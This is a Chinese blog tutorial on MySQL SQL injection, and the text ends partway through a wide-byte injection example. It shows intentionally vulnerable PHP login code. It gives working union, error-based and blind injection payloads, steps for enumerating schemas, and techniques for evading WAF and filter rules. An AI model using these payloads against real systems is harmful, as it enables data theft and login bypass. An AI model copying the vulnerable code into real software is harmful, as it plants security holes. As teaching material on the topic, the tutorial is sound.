&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1095571/202002/1095571-20200221065922601-776767748.png&quot; alt=&quot;数据库结构简易图&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，mysql可以管理&lt;strong&gt;多个数据库&lt;/strong&gt;，一个数据库可以包含&lt;strong&gt;多个数据表&lt;/strong&gt;，而一个数据表有含有&lt;strong&gt;多条字段&lt;/strong&gt;，一行数据正是&lt;strong&gt;多个字段同一行&lt;/strong&gt;的一串数据。&lt;/p&gt;

&lt;p&gt;简单的来说，SQL注入是开发者没有对用户的输入数据进行严格的限制/转义，致使用户在输入一些特定的字符时，在与后端设定的sql语句进行拼接时产生了歧义，使得用户可以控制该条sql语句与数据库进行通信。&lt;/p&gt;
&lt;p&gt;举个例子：&lt;/p&gt;
&lt;pre class=&quot;php&quot;&gt;
&lt;code&gt;&amp;lt;?php
$conn = mysqli_connect($servername, $username, $password, $dbname);
if (!$conn) {
    die(&quot;Connection failed: &quot; . mysqli_connect_error());
}
$username = @$_POST['username'];
$password = @$_POST['password'];
$sql = &quot;select * from users where username = '$username' and password='$password';&quot;;
$rs = mysqli_query($conn,$sql);
if($rs-&amp;gt;fetch_row()){
    echo &quot;success&quot;;
}else{
    echo &quot;fail&quot;;
}
?&amp;gt;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述代码将模拟一个web应用程序进行登录操作。若登录成功，则返回success，否则，返回fail。&lt;/p&gt;
&lt;p&gt;通常正常用户进行登录的sql语句为：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;select * from users where username = '$username' and password='$password'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中，变量$username 与变量$password为用户可以控制的内容，正常情况下，用户所输入的内容在sql语义上都将作为字符错，被赋值给前边的字段来当做整条select查询语句的筛选条件。&lt;/p&gt;
&lt;p&gt;若用户输入的$username为&lt;code&gt;admin'#&lt;/code&gt;，$password为&lt;code&gt;123&lt;/code&gt;。那么拼接到sql语句中将得到如下结果：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;select * from users where username = 'admin'#' and password='123'&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的&lt;code&gt;#&lt;/code&gt;是单行注释符，可以将后边的内容给注释掉。那么此条语句的语义将发生了变化，用户可以不需要判断密码，只需一个用户名，即可完成登录操作，这与开发者的初衷相悖。&lt;/p&gt;

&lt;p&gt;我们知道，在数据库中，常见的对数据进行处理的操作有：&lt;strong&gt;增、删、查、改&lt;/strong&gt;这四种。&lt;/p&gt;
&lt;p&gt;每一项操作都具有不同的作用，共同构成了对数据的绝大部分操作。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;增。顾名思义，也就是增加数据。在通用的SQL语句中，其简单结构通常可概述为: &lt;code&gt;INSERT table_name(columns_name) VALUES(new_values)&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;删。删除数据。简单结构为: &lt;code&gt;DELETE table_name WHERE condition&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;查。查询语句可以说是绝大部分应用程序最常用到的SQL语句，他的作用就是查找数据。其简单结构为：&lt;code&gt;SELECT columns_name FROM table_name WHERE condition&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;改。有修改/更新数据。简单结构为:&lt;code&gt;UPDATE table_name SET column_name=new_value WHERE condition&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;PS：以上SQL语句中，系统关键字全部进行了大写处理。&lt;/p&gt;
&lt;h2 id=&quot;查&quot;&gt;查&lt;/h2&gt;
&lt;p&gt;mysql的查询语句完整格式如下：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;SELECT
    [ALL | DISTINCT | DISTINCTROW ]
      [HIGH_PRIORITY]
      [STRAIGHT_JOIN]
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
    select_expr [, select_expr ...]
    [FROM table_references
      [PARTITION partition_list]
    [WHERE where_condition]
    [GROUP BY {col_name | expr | position}
      [ASC | DESC], ... [WITH ROLLUP]]
    [HAVING where_condition]
    [ORDER BY {col_name | expr | position}
      [ASC | DESC], ...]
    [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通常注入点发生在where_condition处，并不是说唯有此处可以注入，其他的位置也可以，只是我们先将此处的注入当做例子来进行讲解，之后会逐渐降到其他的位置该如何进行注入。&lt;/p&gt;
&lt;p&gt;对于&lt;code&gt;SELECT&lt;/code&gt;语句，我们通常分其为两种情况：有回显和无回显。&lt;/p&gt;
&lt;h3 id=&quot;有回显&quot;&gt;有回显&lt;/h3&gt;
&lt;p&gt;什么叫有回显？别急，我们来举个例子。&lt;/p&gt;
&lt;p&gt;当我们点击一篇文章阅读时，其URL为&lt;code&gt;read.php?id=1&lt;/code&gt;，我们可以很容易地猜出其SQL语句可能为&lt;code&gt;select * from articles where id='$id'&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这时候页面将SQL语句返回的内容显示在了页面中(本例中是标题、内容、作者等信息)，这种情况就叫有回显。&lt;/p&gt;
&lt;p&gt;对于有回显的情况来说，我们通常使用&lt;strong&gt;联合查询注入法&lt;/strong&gt;。&lt;/p&gt;
&lt;h4 id=&quot;联合查询注入&quot;&gt;联合查询注入&lt;/h4&gt;
&lt;p&gt;其作用就是，在原来查询条件的基础上，通过系统关键字&lt;code&gt;union&lt;/code&gt;从而拼接上我们自己的&lt;code&gt;select&lt;/code&gt;语句，后个&lt;code&gt;select&lt;/code&gt;得到的结果将拼接到前个&lt;code&gt;select&lt;/code&gt;的结果后边。如：前个&lt;code&gt;select&lt;/code&gt;得到2条数据，后个&lt;code&gt;select&lt;/code&gt;得到1条数据，那么后个&lt;code&gt;select&lt;/code&gt;的数据将作为&lt;strong&gt;第3条&lt;/strong&gt;拼接到第一个&lt;code&gt;select&lt;/code&gt;返回的内容中，其字段名将&lt;strong&gt;按照位置&lt;/strong&gt;关系进行继承。&lt;/p&gt;
&lt;p&gt;如：&lt;code&gt;正常查询语句 union select columns_name from (database.)table_name where condition&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这里需要注意的是：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;若回显仅支持一行数据的话，记得&lt;strong&gt;让前边正常的查询语句返回的结果为空&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;使用union select进行拼接时，注意&lt;strong&gt;前后两个select语句的返回的字段数必须相同&lt;/strong&gt;，否则无法拼接。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;无回显&quot;&gt;无回显&lt;/h3&gt;
&lt;p&gt;什么叫无回显？之前举得登录判断就是一个无回显的例子。如果SQL语句存在返回的数据，那么页面输出为success，若不存在返回的数据，则输出fail。&lt;/p&gt;
&lt;p&gt;与有回显情况不同的是：无回显的页面输出内容并不是SQL语句返回的内容。&lt;/p&gt;
&lt;p&gt;对于无回显的情况，我们通常可用两种方法进行注入：&lt;strong&gt;报错注入&lt;/strong&gt;与&lt;strong&gt;盲注&lt;/strong&gt;。&lt;/p&gt;
&lt;h4 id=&quot;报错注入&quot;&gt;报错注入&lt;/h4&gt;
&lt;p&gt;什么是报错注入，简单的说，就是有些特殊的函数，会在其报错信息里可能会返回其参数的值。&lt;/p&gt;
&lt;p&gt;我们可以利用这一特性，在其参数放入我们想要得到的数据，通常使用子查询的方法实现，最后让其报错并输出结果。&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;正常语句 (where | and) exp(~(select * from(select user())a));

正常语句 (where | and) updatexml(1,concat(0x7e,(select user()),0x7e),1);&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;盲注&quot;&gt;盲注&lt;/h4&gt;
&lt;p&gt;若网站设置了无报错信息返回，那么在&lt;strong&gt;不直接返回数据+不返回报错信息&lt;/strong&gt;的情况下，盲注便几乎成了最后一种直接注入取数据的方法了。&lt;/p&gt;
&lt;p&gt;其中，盲注分成&lt;strong&gt;布尔盲注&lt;/strong&gt;和&lt;strong&gt;时间盲注&lt;/strong&gt;。&lt;/p&gt;
&lt;h5 id=&quot;布尔盲注&quot;&gt;布尔盲注&lt;/h5&gt;
&lt;p&gt;对于布尔盲注来说，其使用的场景在于：&lt;strong&gt;对真/假条件返回的内容很容易区分&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;比如说，有这么一条正常的select语句，我们再起where条件后边加上and 1=2，我们知道，1永远不等于2，那么这个条件就是一个永假条件，我们使用and语句连上，那么整个where部分就是永假的，这时候select语句是不会返回内容的。将其返回的内容与正常页面进行对比，如果很容易区分的话，那么布尔盲注试用。&lt;/p&gt;
&lt;p&gt;如：&lt;code&gt;正常语句 (where | and) if(substr((select password from users where username='admin'),1,1)='a',1,0)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;##### 时间盲注&lt;/p&gt;
&lt;p&gt;相比较于布尔盲注，时间盲注依赖于通过&lt;strong&gt;页面返回的延迟时间&lt;/strong&gt;来判断条件是否正确。&lt;/p&gt;
&lt;p&gt;使用场景：布尔盲注永假条件所返回的内容与正常语句返回的内容很接近/相同，无法判断情况。&lt;/p&gt;
&lt;p&gt;简单的来说，时间盲注就是，如果我们自定义的条件为假的话，我们让其0延迟通过，如果条件为真的话，使用sleep()等函数，让sql语句的返回产生延迟。&lt;/p&gt;
&lt;p&gt;如：&lt;code&gt;正常语句（where | and）if(substr((select password from users where username='admin'),1,1)='a',sleep(3),1)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最后总结一下:&lt;/p&gt;
&lt;p&gt;常见注入方法有三种：&lt;code&gt;联合查询注入、报错注入、盲注&lt;/code&gt;，其中：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;有回显：&lt;strong&gt;三种均可使用&lt;/strong&gt;，推荐使用联合查询注入。&lt;/li&gt;
&lt;li&gt;无回显：&lt;strong&gt;报错注入+盲注可用&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;对于时间成本来说：联合查询注入&amp;lt;报错注入&amp;lt;&amp;lt;盲注。&lt;/p&gt;
&lt;p&gt;通常情况下，盲注需要一个一个字符的进行判断。这极大的增加了时间成本，况且对于时间盲注来说，还需要额外的延迟时间来作为判断的标准。&lt;/p&gt;
&lt;h3 id=&quot;三大注入的基本步骤&quot;&gt;三大注入的基本步骤&lt;/h3&gt;
&lt;h4 id=&quot;联合查询注入步骤&quot;&gt;联合查询注入步骤&lt;/h4&gt;
&lt;p&gt;1) 首先，先确定字段数量。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;order/group by&lt;/code&gt;语句。通过往后边拼接数字，可确定字段数量，&lt;strong&gt;若大于，则页面错误/无内容，若小于或等于，则页面正常&lt;/strong&gt;。若错误页与正常页一样，更换报错注入/盲注。&lt;/p&gt;
&lt;p&gt;2) 第二步，判断页面回显数据的字段位置。&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;union select 1,2,3,4,x...&lt;/code&gt; 我们定义的数字将显示在页面上，即可从中判断页面显示的字段位置。&lt;/p&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的&lt;code&gt;select&lt;/code&gt;查询条件返回结果为空即可。&lt;/li&gt;
&lt;li&gt;注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条&lt;code&gt;select&lt;/code&gt;语句的方法之一。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;3) 第三步，在显示的字段位置使用子查询来查询数据，或直接查询也可。&lt;/p&gt;
&lt;p&gt;首先，查询当前数据库名database()、数据库账号user()、数据库版本version()等基本情况，再根据不同的版本、不同的权限确定接下来的方法。&lt;/p&gt;
&lt;h5 id=&quot;若mysql版本5.0&quot;&gt;若Mysql版本&amp;lt;5.0&lt;/h5&gt;
&lt;p&gt;简单的说，由于mysql的低版本缺乏系统库&lt;strong&gt;information_schema&lt;/strong&gt;，故通常情况下，我们无法直接查询表名，字段(列)名等信息，这时候只能靠&lt;strong&gt;猜&lt;/strong&gt;来解决。&lt;/p&gt;
&lt;p&gt;直接猜表名与列名是什么，甚至是库名，再使用联合查询取数据。&lt;/p&gt;
&lt;p&gt;若知道仅表名而不知道列(字段)名：&lt;/p&gt;
&lt;p&gt;可通过以下payload：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;若多字段：select `x` from(select 1,2,3,4,xxx from table_name union select * from table_name)a&lt;/li&gt;
&lt;li&gt;若单字段：select *,1,2,xxx from table_name&lt;/li&gt;
&lt;/ul&gt;&lt;h5 id=&quot;若mysql版本5.0-1&quot;&gt;若Mysql版本&amp;gt;=5.0&lt;/h5&gt;
&lt;p&gt;首先去一个名为&lt;strong&gt;information_schema&lt;/strong&gt;的数据库里的&lt;strong&gt;shemata&lt;/strong&gt;数据表查询&lt;strong&gt;全部数据库名&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;若不需要跨数据库的话，可直接跳过此步骤，直接查询相应的数据库下的全部数据表名。&lt;/p&gt;
&lt;p&gt;在information_schema的一个名为&lt;strong&gt;tables&lt;/strong&gt;的数据表中存着全部的&lt;strong&gt;数据表信息&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;其中，&lt;strong&gt;table_name 字段保存其名称&lt;/strong&gt;，&lt;strong&gt;table_schema保存其对应的数据库名&lt;/strong&gt;。&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;union select 1,2,group_concat(table_name),4,xxxx from information_schema.tables where table_schema=database();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述payload可查看全部的数据表名，其中group_concat函数将多行数据转成一行数据。&lt;/p&gt;
&lt;p&gt;接着通过其表名，查询该表的所有字段名，有时也称列名。&lt;/p&gt;
&lt;p&gt;通过information_schema库下的&lt;strong&gt;columns&lt;/strong&gt;表可查询对应的数据库/数据库表含有的字段名。&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;Union select 1,2,group_concat(column_name),4,xxxx from information_schema.columns where table_schema=database() and table_name=(table_name)#此处的表名为字符串型，也通过十六进制表示&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;知道了想要的数据存放的数据库、数据表、字段名，直接联合查询即可。&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;Union select 1,2,column_name,4,xxx from (database_name.)table_name&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;简单的说，&lt;strong&gt;查库名-&amp;gt;查表名-&amp;gt;查字段名-&amp;gt;查数据&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;盲注步骤&quot;&gt;盲注步骤：&lt;/h3&gt;
&lt;p&gt;核心：利用&lt;strong&gt;逻辑代数连接词/条件函数&lt;/strong&gt;，让页面&lt;strong&gt;返回的内容/响应时间&lt;/strong&gt;与正常的页面不符。&lt;/p&gt;
&lt;h4 id=&quot;布尔盲注-1&quot;&gt;&lt;em&gt;布尔盲注：&lt;/em&gt;&lt;/h4&gt;
&lt;p&gt;首先通过页面对于永真条件&lt;code&gt;or 1=1&lt;/code&gt;与永假条件&lt;code&gt;and 1=2&lt;/code&gt;的返回内容是否存在差异进行判断是否可以进行布尔盲注。&lt;/p&gt;
&lt;p&gt;如：&lt;code&gt;select * from users where username=$username&lt;/code&gt;，其作用设定为&lt;em&gt;判断用户名是否存在&lt;/em&gt;。&lt;/p&gt;
&lt;p&gt;通常仅返回&lt;strong&gt;存在/不存在&lt;/strong&gt;，两个结果。&lt;/p&gt;
&lt;p&gt;这时候我们就不能使用联合查询法注入，因为页面显示SQL语句返回的内容，只能使用&lt;strong&gt;盲注法/报错注入法&lt;/strong&gt;来注出数据。&lt;/p&gt;
&lt;p&gt;我们在将语句注入成：&lt;code&gt;select * from users where username=$username or (condition)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;若后边拼接的条件为真的话，那么整条语句的where区域将变成&lt;strong&gt;永真&lt;/strong&gt;条件。&lt;/p&gt;
&lt;p&gt;那么，即使我们在$username处输入的用户名为一个铁定不存在的用户名，那么返回的结果也仍然为存在。&lt;/p&gt;
&lt;p&gt;利用这一特性，我们的condition为：length(database())&amp;gt;8 即可用于判断数据库名长度&lt;/p&gt;
&lt;p&gt;除此之外，还可：ascii(substr(database(),1,1))&amp;lt;130 用二分法快速获取数据名(逐字判断)&lt;/p&gt;
&lt;p&gt;payload如下：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select * from users where username=nouser or length(database())&amp;gt;8
select * from users where username=nouser or ascii(substr(database(),1,1))&amp;lt;130&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;时间盲注&quot;&gt;&lt;em&gt;时间盲注：&lt;/em&gt;&lt;/h4&gt;
&lt;p&gt;通过判断页面&lt;strong&gt;返回内容的响应时间差异&lt;/strong&gt;进行条件判断。&lt;/p&gt;
&lt;p&gt;通常可利用的产生时间延迟的函数有：&lt;strong&gt;sleep()、benchmark()&lt;/strong&gt;，还有许多进行&lt;strong&gt;复杂运算的函数&lt;/strong&gt;也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。&lt;/p&gt;
&lt;p&gt;如上述例子：若服务器在执行永真/永假条件并不直接返回两个容易区分的内容时，利用时间盲注或许是个更好的办法。&lt;/p&gt;
&lt;p&gt;在上述语句中，我们拼接语句，变成：&lt;/p&gt;
&lt;pre class=&quot;mysql&quot;&gt;
&lt;code&gt;select * from users where username=$username (and | or) if(length(database())&amp;gt;8,sleep(3),1)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果数据库名的长度大于8，那么if条件将执行sleep(3)，那么此条语句将进行延迟3秒的操作。&lt;/p&gt;
&lt;p&gt;若小于或等于8，则if条件直接返回1，并与前边的逻辑连接词拼接，无延迟直接返回。通常的响应时间在0-1秒之内，与上种情况具有很容易区分的结果，可做条件判断的依据。&lt;/p&gt;
&lt;h3 id=&quot;报错注入步骤&quot;&gt;报错注入步骤：&lt;/h3&gt;
&lt;p&gt;通过&lt;strong&gt;特殊函数&lt;/strong&gt;的错误使用使其参数被页面输出。&lt;/p&gt;
&lt;p&gt;前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。&lt;/p&gt;
&lt;p&gt;常见的利用函数有：&lt;code&gt;exp()、floor()+rand()、updatexml()、extractvalue()&lt;/code&gt;等&lt;/p&gt;
&lt;p&gt;如：&lt;code&gt;select * from users where username=$username (and | or) updatexml(1,concat(0x7e,(select user()),0x7e),1)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因为updatexml函数的第二个参数需要满足xpath格式，我们在其前后添加字符~，使其不满足xpath格式，进行报错并输出。&lt;/p&gt;
&lt;p&gt;将上述payload的(select user())当做联合查询法的注入位置，接下来的操作与联合查询法一样。&lt;/p&gt;
&lt;p&gt;注意：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;报错函数通常尤其最长报错输出的限制，面对这种情况，可以进行分割输出。&lt;/li&gt;
&lt;li&gt;特殊函数的特殊参数进运行一个字段、一行数据的返回，使用group_concat等函数聚合数据即可。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;增删改&quot;&gt;增、删、改&lt;/h2&gt;
&lt;p&gt;可简单当做无回显的Select语句进行注入。值得注意的是，通常增&lt;code&gt;insert&lt;/code&gt;处的注入点在测试时会产生大量的垃圾数据，删delete处的注入千万要注意where条件不要为永真。&lt;/p&gt;

&lt;p&gt;到目前为止，我们讲了Mysql注入的基本入门，那么接下来我将会花费大部分时间介绍我学习mysql注入遇到的一些知识点。&lt;/p&gt;
&lt;h2 id=&quot;常见防御手段绕过&quot;&gt;常见防御手段绕过&lt;/h2&gt;
&lt;p&gt;在讲绕过之前，我认为有必要先讲讲什么是：过滤与拦截。&lt;/p&gt;
&lt;p&gt;简单的说就是：过滤指的是，我们输入的部分内容在拼接SQL语句之前被程序删除掉了，接着将过滤之后的内容拼接到SQL语句并继续与数据库通信。而拦截指的是：若检测到指定的内容存在，则直接返回拦截页面，同时不会进行拼接SQL语句并与数据库通信的操作。&lt;/p&gt;
&lt;p&gt;若程序设置的是过滤，则若过滤的字符不为单字符，则可以使用双写绕过。&lt;/p&gt;
&lt;p&gt;举个例子：程序过滤掉了&lt;code&gt;union&lt;/code&gt;这一关键词，我们可以使用&lt;code&gt;ununionion&lt;/code&gt;来绕过。&lt;/p&gt;
&lt;p&gt;PS：一般检测方法都是利用的正则，注意观察正则匹配时，是否忽略大小写匹配，若不忽略，直接使用大小写混搭即可绕过。&lt;/p&gt;
&lt;h3 id=&quot;andor-被过滤拦截&quot;&gt;and/or 被过滤/拦截&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;双写&lt;code&gt;anandd、oorr&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;使用运算符代替&lt;code&gt;&amp;amp;&amp;amp;、||&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;直接拼接&lt;code&gt;=&lt;/code&gt;号，如：&lt;code&gt;?id=1=(condition)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;其他方法，如：&lt;code&gt;?id=1^(condition)&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;空格被过滤拦截&quot;&gt;空格被过滤/拦截&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;多层括号嵌套&lt;/li&gt;
&lt;li&gt;改用+号&lt;/li&gt;
&lt;li&gt;使用注释代替&lt;/li&gt;
&lt;li&gt;&lt;code&gt;and/or&lt;/code&gt;后面可以跟上偶数个&lt;code&gt;!、~&lt;/code&gt;可以替代空格，也可以混合使用(规律又不同)，and/or前的空格可用省略&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%09, %0a, %0b, %0c, %0d, %a0&lt;/code&gt;等部分不可见字符可也代替空格&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;如：&lt;code&gt;select * from user where username='admin'union(select+title,content/**/from/*!article*/where/**/id='1'and!!!!~~1=1)&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;括号被过滤拦截&quot;&gt;括号被过滤/拦截&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;order by 大小比较盲注&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;逗号被过滤拦截&quot;&gt;逗号被过滤/拦截&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;改用盲注&lt;/li&gt;
&lt;li&gt;使用join语句代替&lt;/li&gt;
&lt;li&gt;&lt;code&gt;substr(data from 1 for 1)&lt;/code&gt;相当于&lt;code&gt;substr(data,1,1)&lt;/code&gt;、&lt;code&gt;limit 9 offset 4&lt;/code&gt;相当于&lt;code&gt;limt 9,4&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;其他系统关键字被过滤拦截&quot;&gt;其他系统关键字被过滤/拦截&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;双写绕过关键字过滤&lt;/li&gt;
&lt;li&gt;使用同义函数/语句代替，如if函数可用&lt;code&gt;case when condition then 1 else 0 end&lt;/code&gt;语句代替。&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;单双引号被过滤拦截转义&quot;&gt;单双引号被过滤/拦截/转义&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入。&lt;/li&gt;
&lt;li&gt;不需要跳出单引号的情况：字符串可用十六进制表示、也可通过进制转换函数表示成其他进制。&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;数字被过滤拦截&quot;&gt;数字被过滤/拦截&lt;/h3&gt;
&lt;blockquote readability=&quot;2.0689655172414&quot;&gt;
&lt;p&gt;下表摘自&lt;a href=&quot;https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html&quot;&gt;MySQL注入技巧&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;12&quot;&gt;&lt;tr class=&quot;odd&quot;&gt;&lt;td&gt;false、!pi()&lt;/td&gt;
&lt;td&gt;0&lt;/td&gt;
&lt;td&gt;ceil(pi()*pi())&lt;/td&gt;
&lt;td&gt;10|A&lt;/td&gt;
&lt;td&gt;ceil((pi()+pi())*pi())&lt;/td&gt;
&lt;td&gt;20|K&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;true、!(!pi())&lt;/td&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;ceil(pi()*pi())+true&lt;/td&gt;
&lt;td&gt;11|B&lt;/td&gt;
&lt;td&gt;ceil(ceil(pi())*version())&lt;/td&gt;
&lt;td&gt;21|L&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;true+true&lt;/td&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;ceil(pi()+pi()+version())&lt;/td&gt;
&lt;td&gt;12|C&lt;/td&gt;
&lt;td&gt;ceil(pi()*ceil(pi()+pi()))&lt;/td&gt;
&lt;td&gt;22|M&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;floor(pi())、~~pi()&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;floor(pi()*pi()+pi())&lt;/td&gt;
&lt;td&gt;13|D&lt;/td&gt;
&lt;td&gt;ceil((pi()+ceil(pi()))*pi())&lt;/td&gt;
&lt;td&gt;23|N&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;ceil(pi())&lt;/td&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;ceil(pi()*pi()+pi())&lt;/td&gt;
&lt;td&gt;14|E&lt;/td&gt;
&lt;td&gt;ceil(pi())*ceil(version())&lt;/td&gt;
&lt;td&gt;24|O&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;6&quot;&gt;&lt;td&gt;floor(version()) //注意版本&lt;/td&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;ceil(pi()*pi()+version())&lt;/td&gt;
&lt;td&gt;15|F&lt;/td&gt;
&lt;td&gt;floor(pi()*(version()+pi()))&lt;/td&gt;
&lt;td&gt;25|P&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;ceil(version())&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;floor(pi()*version())&lt;/td&gt;
&lt;td&gt;16|G&lt;/td&gt;
&lt;td&gt;floor(version()*version())&lt;/td&gt;
&lt;td&gt;26|Q&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;ceil(pi()+pi())&lt;/td&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;ceil(pi()*version())&lt;/td&gt;
&lt;td&gt;17|H&lt;/td&gt;
&lt;td&gt;ceil(version()*version())&lt;/td&gt;
&lt;td&gt;27|R&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;2&quot;&gt;&lt;td&gt;floor(version()+pi())&lt;/td&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;ceil(pi()*version())+true&lt;/td&gt;
&lt;td&gt;18|I&lt;/td&gt;
&lt;td&gt;ceil(pi()&lt;em&gt;pi()&lt;/em&gt;pi()-pi())&lt;/td&gt;
&lt;td&gt;28|S&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;2&quot;&gt;&lt;td&gt;floor(pi()*pi())&lt;/td&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;floor((pi()+pi())*pi())&lt;/td&gt;
&lt;td&gt;19|J&lt;/td&gt;
&lt;td&gt;floor(pi()&lt;em&gt;pi()&lt;/em&gt;floor(pi()))&lt;/td&gt;
&lt;td&gt;29|T&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 id=&quot;编码转换产生的问题&quot;&gt;编码转换产生的问题&lt;/h2&gt;
&lt;h3 id=&quot;宽字节注入&quot;&gt;宽字节注入&lt;/h3&gt;
&lt;p&gt;什么是宽字节注入？下面举个例子来告诉你。&lt;/p&gt;
&lt;pre class=&quot;php&quot;&gt;
&lt;code&gt;&amp;lt;?php
$conn = mysqli_connect(&quot;127.0.0.1:3307&quot;, &quot;root&quot;, &quot;root&quot;, &quot;db&quot;);
if (!$conn) {
    die(&quot;Connection failed: &quot; . mysqli_connect_error());
}
$conn-&amp;gt;query(&quot;set names 'gbk';&quot;);
$username = addslashes(@$_POST['username']);
$password = addslashes(@$_POST['password']);
$sql = &quot;select * from users where username = '$username' and password='$password';&quot;;
$rs = mysqli_query($conn,$sql);
echo $sql.'&amp;lt;br&amp;gt;';
if($rs-&amp;gt;fetch_row()){
    echo &quot;success&quot;;
}else{
